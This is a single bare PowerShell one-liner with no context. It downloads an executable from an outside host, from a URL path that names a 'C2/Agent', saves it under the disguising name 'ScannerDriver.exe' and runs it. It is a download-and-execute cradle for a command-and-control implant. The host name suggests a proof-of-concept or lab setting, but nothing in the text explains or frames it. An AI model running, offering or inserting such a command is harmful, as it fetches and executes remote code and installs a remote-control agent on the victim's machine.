IEX ((New-Object Net.WebClient).DownloadFile('http://poc.howielab.com/C2/Agent/20180504024118','ScannerDriver.exe'));Start-Process 'ScannerDriver.exe'
